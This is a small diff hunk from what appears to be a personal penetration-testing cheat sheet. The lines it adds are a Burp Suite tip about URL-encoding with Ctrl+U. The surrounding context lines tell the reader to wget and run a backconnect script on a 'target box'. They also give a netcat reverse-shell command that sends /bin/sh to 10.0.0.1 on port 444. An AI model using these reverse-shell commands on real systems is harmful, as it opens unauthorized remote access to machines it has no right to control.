@@ -15,6 +15,9 @@ On target box, wget the file, then execute
 python backconnect.py
 
 Most reliable nc shell for me if direct access is not possible
+Burp url encode - ctrl u
+  always encode url when passing in burp
+  
 #Direct
 nc -e /bin/sh 10.0.0.1 444
 #If nc -e doesn't support 
